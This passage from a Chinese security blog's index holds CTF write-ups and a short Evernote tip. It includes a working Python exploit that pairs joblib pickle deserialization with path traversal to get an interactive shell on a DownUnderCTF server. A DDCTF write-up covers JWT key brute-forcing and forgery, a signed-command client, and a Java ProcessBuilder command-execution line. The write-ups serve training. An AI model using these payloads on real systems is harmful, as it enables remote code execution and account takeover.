Picture&quot;&gt;</code>） 相同。</p><p>在 stock 位置有目录穿越，也就意味着 joblib 反序列时，可以指定为自己上传的文件。</p><p>基本思路：构建 payload（命令执行结果写回文件） -&gt; 命令序列化后存入文件 -&gt; 将文件做为头像传入系统 -&gt; 在 stock 处反序列化上传的文件 -&gt; 读取头像。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64 <span class="hljs-keyword">as</span> b64<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> joblib<br><span class="hljs-keyword">import</span> io<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">base64Padding</span>(<span class="hljs-params">data</span>):</span><br>    missing_padding = <span class="hljs-number">4</span> - len(data) % <span class="hljs-number">4</span><br>    <span class="hljs-keyword">if</span> missing_padding:<br>        data += <span class="hljs-string">&#x27;=&#x27;</span> * missing_padding<br>    <span class="hljs-keyword">return</span> data<br><br>REMOTE = <span class="hljs-string">&#x27;https://chal.duc.tf:30104/&#x27;</span><br>session = requests.Session()<br><br><span class="hljs-comment"># 1. 登陆</span><br>resp = session.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/login&#x27;</span>, data=&#123;<br>    <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;hacker&#x27;</span><br>&#125;)<br><br><span class="hljs-comment"># 2。 获取 Cookie</span><br>token = json.loads(<br>    b64.b64decode(base64Padding(session.cookies[<span class="hljs-string">&#x27;session&#x27;</span>].split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>])).decode()<br>)<br>uid = token[<span class="hljs-string">&#x27;id&#x27;</span>]<br><br>resp = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/profile-picture/<span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span>)<br><br>remote_path = resp.text.split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">-1</span>].replace(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;uid&#125;</span>.png&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).rstrip(<span class="hljs-string">&#x27;/&#x27;</span>)<br><span class="hljs-comment"># print(remote_path)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_payload</span>(<span class="hljs-params">cmd</span>):</span><br>    payload = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;cmd&#125;</span> &gt; <span class="hljs-subst">&#123;remote_path&#125;</span>/<span class="hljs-subst">&#123;uid&#125;</span>.png&#x27;</span><br>    <span class="hljs-comment"># print(payload)</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span>:</span><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>            <span class="hljs-keyword">return</span> (os.system, (payload,))<br><br>    <span class="hljs-keyword">return</span> Model()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exec_cmd</span>(<span class="hljs-params">cmd</span>):</span><br>    <span class="hljs-comment"># 将 payload 序列化后写入文件。</span><br>    tmpfile = io.BytesIO()<br>    joblib.dump(make_payload(cmd), tmpfile)<br>    tmpfile.seek(<span class="hljs-number">0</span>)<br>    <br>    <span class="hljs-comment"># session 上传文件</span><br>    resp = session.post(<br>        url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/profile-picture&#x27;</span>,<br>        files=&#123;<br>            <span class="hljs-string">&#x27;img&#x27;</span>: (<span class="hljs-string">&#x27;1.png&#x27;</span>, tmpfile)<br>        &#125;<br>    )<br>    <br>    <span class="hljs-comment"># 定位问题的位置</span><br>    <span class="hljs-keyword">assert</span> resp.ok<br>    <br>    <span class="hljs-comment"># 使运行文件中序列化的命令</span><br>    resp = session.post(<br>        url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/predict&#x27;</span>,<br>        data=&#123;<br>            <span class="hljs-string">&#x27;stock&#x27;</span>: <span class="hljs-string">&#x27;../&#x27;</span> * <span class="hljs-number">16</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;remote_path&#125;</span>/<span class="hljs-subst">&#123;uid&#125;</span>.png&#x27;</span>,<br>            <span class="hljs-string">&#x27;prices&#x27;</span>: <span class="hljs-string">&#x27;1,2&#x27;</span><br>        &#125;<br>    )<br>    <br>    <span class="hljs-comment"># 读取命令执行的结果</span><br>    resp = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/profile-picture/<span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> resp.text<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd = input()<br>    print(exec_cmd(cmd))<br>    print(<span class="hljs-string">&#x27;----------------------------&#x27;</span>)<br><br></code></pre></td></tr></table></figure><hr><h1 id="Design-COMP"><a href="#Design-COMP" class="headerlink" title="Design COMP"></a>Design COMP</h1><p>题目链接：<a href="https://chal.duc.tf:30105/">https://chal.duc.tf:30105/</a></p><p>Come join our homepage design competition and test out your CSS skills!<br>Snippet of admin code: <a href="https://gist.github.com/uint0/21e677a7daf177f115486b9f952037da">https://gist.github.com/uint0/21e677a7daf177f115486b9f952037da</a></p><p>题解链接：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/design-comp">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/design-comp</a></p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决印象笔记粘贴代码缩进混乱的问题</title>
    <link href="/2020/09/30/20200930-%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/09/30/20200930-%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>从网页中粘贴代码到印象笔记经常会出现缩进失效.</p><a id="more"></a><ul><li><p>使用 Ctrl + V 直接进行粘贴的结果。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930095549.png"></p></li><li><p>先粘贴到 VScode，再复制 vscode 中的代码进行粘贴(可是我不想再打开 vscode)<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930095611.png"></p></li><li><p>使用 Alfred 的剪贴板，得到的结果和 vscode 相同。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020年9月DDCTF题解</title>
    <link href="/2020/09/14/20200914-DDCTF/"/>
    <url>/2020/09/14/20200914-DDCTF/</url>
    
    <content type="html"><![CDATA[<p>挺难的（</p><a id="more"></a><h1 id="web：web签到题"><a href="#web：web签到题" class="headerlink" title="web：web签到题"></a>web：web签到题</h1><p>个人觉得挺难的，只做出来一道题，而且这道题需要 pwn 和 web 相结合。</p><h2 id="步骤1：JWT绕过"><a href="#步骤1：JWT绕过" class="headerlink" title="步骤1：JWT绕过"></a>步骤1：JWT绕过</h2><p>图1:题目给定初始条件。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200913233709.png"></p><p>向 api 发送请求，得到响应如下，data 的数据格式和 jwt 相似，猜测为 jwt 绕过。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;code&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-attr">&quot;message&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br><span class="hljs-attr">&quot;data&quot;</span>: <span class="hljs-string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InN0ciIsInB3ZCI6InN0ciIsInVzZXJSb2xlIjoiR1VFU1QiLCJleHAiOjE1OTkyODY0NzB9.z-i_zjudu5yejiFbCnE9P5NIjOJE61Bzpw75OX1SHmg&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我只做过一次 JWT 绕过的题目，并且当时记笔记的习惯不好，早已忘记。于是先查询了一下 <a href="evernote:///view/24913208/s27/10cd3f6d-645f-475a-a439-8efbdaba360c/10cd3f6d-645f-475a-a439-8efbdaba360c/">JWT 相关原理和基本步骤</a>，初略指导该漏洞可以使用 5 种方式进行攻击。考虑从最简单的暴力破解 key 开始尝试，使用 <a href="https://delcoding.github.io/2018/03/jwt-bypass/">Junay 大佬博客</a>推荐的<a href="https://github.com/brendan-rius/c-jwt-cracker">工具</a>进行尝试，爆破出密码为 str（不同的人密码可能不同），然后到 <a href="https://jwt.io/">https://jwt.io/</a> 进行 jwt 伪造，将伪造后的 jwt 发送到 auth interface 得到 client 下载链接。</p><p>图2:爆破得到的密码<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200913233726.png"></p><h2 id="步骤2：逆向绕过客户端"><a href="#步骤2：逆向绕过客户端" class="headerlink" title="步骤2：逆向绕过客户端"></a>步骤2：逆向绕过客户端</h2><p>获得 client 后，由队里的其他大佬进行逆向分析，并制作模拟客户端的工具。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> pprint <span class="hljs-keyword">import</span> pprint<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd = input()  <span class="hljs-comment"># 发送的命令</span><br><br>    appkey = <span class="hljs-string">&quot;DDCTFWithYou&quot;</span><br>    time_stamp = str(int(time()))<br>    strToSign = cmd + <span class="hljs-string">&#x27;|&#x27;</span> + time_stamp<br><br>    <span class="hljs-comment"># hmac_sha256加密</span><br>    sha = hmac.new(<br>        bytes(appkey, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>        bytes(strToSign, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>        digestmod=hashlib.sha256<br>    ).digest()<br>    sign = bytes.decode(<br>        b64encode(sha)<br>    )<br><br>    <span class="hljs-comment"># 发起POST请求</span><br>    url = <span class="hljs-string">&quot;http://117.51.136.197/server/command&quot;</span><br>    data = &#123;<br>        <span class="hljs-string">&quot;signature&quot;</span>: sign,<br>        <span class="hljs-string">&quot;command&quot;</span>: cmd,<br>        <span class="hljs-string">&quot;timestamp&quot;</span>: time_stamp<br>    &#125;<br>    res = requests.post(<br>        url=url,<br>        data=json.dumps(data)<br>    )<br>    pprint(res.text)<br></code></pre></td></tr></table></figure><h2 id="步骤3：命令执行"><a href="#步骤3：命令执行" class="headerlink" title="步骤3：命令执行"></a>步骤3：命令执行</h2><p>判断后端语言，构造 payload。首先利用语言的运算符测试是否执行，总结存在哪些运算符，然后测试出字符串可以使用 length 函数，猜测可能该语言为「面向对象语言」，从逻辑运算符 != 和 length 函数猜测可能是 <a href="https://coolshell.cn/articles/2631.html">Java 衍生的语言</a>（输入的命令以 # 定义变量，可使用 #a=1 测试）——<a href="http://groovy.codehaus.org/"><strong>Groovy</strong></a>，但是始终无法完美匹配。最终在一篇<a href="https://zhuanlan.kanxue.com/article-12714.htm">博客</a>找到突破点，文章中的很多情景很符合该题目，测试 java.lang.String.class.forName(“java.lang.Runtime”) 时出现 command is evil，断定为 Groovy。于是便开始寻找 Java 命令注入代码，<a href="https://y4er.com/post/java-exec-command/">网上大多数的命令执行</a>大都是使用 Runtime 类或 Processbuider 类，但都是多行代码的形式，<a href="https://github.com/t0kx/exploit-CVE-2015-1427/blob/master/exploit.sh">CVE-2015-1427 的 exploit</a> 也无法执行。网上的命名只有一行为命令执行，我们猜测可以采用乱码方式进行回显，然后在本地解码，然后从 IDEA 自动补全找到 readAllBytes 函数，将数据读出。然后把读出的数据使用 Base64 解码就得到命令执行的结果。</p><p>图3：编程语言分类<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200913233927.png"></p><p>code：一些关键性的测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span> == true<br><span class="hljs-comment">#a = 1</span><br>&#123;<span class="hljs-number">1</span>&#125;<br><span class="hljs-string">&#x27;abc&#x27;</span>.length()<br><span class="hljs-string">&#x27;abc&#x27;</span>.concat(<span class="hljs-string">&#x27;d&#x27;</span>)<br><span class="hljs-string">&#x27;12 &#x27;</span>.trim()<br><span class="hljs-string">&#x27;1234&#x27;</span>.getBytes()<br><span class="hljs-string">&#x27;hello&#x27;</span>.startsWith(<span class="hljs-string">&#x27;1&#x27;</span>)<br>new ProcessBuilder(<span class="hljs-string">&quot;ls&quot;</span>).start().getInputStream().readAllBytes()<br></code></pre></td></tr></table></figure><p>图4：使用 readAllBytes 读出数据<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20200913234130453.png" alt="image-20200913234130453"></p><p>将读出的数据使用 base64 解开即可。</p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>JWT</tag>
      
      <tag>Java命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
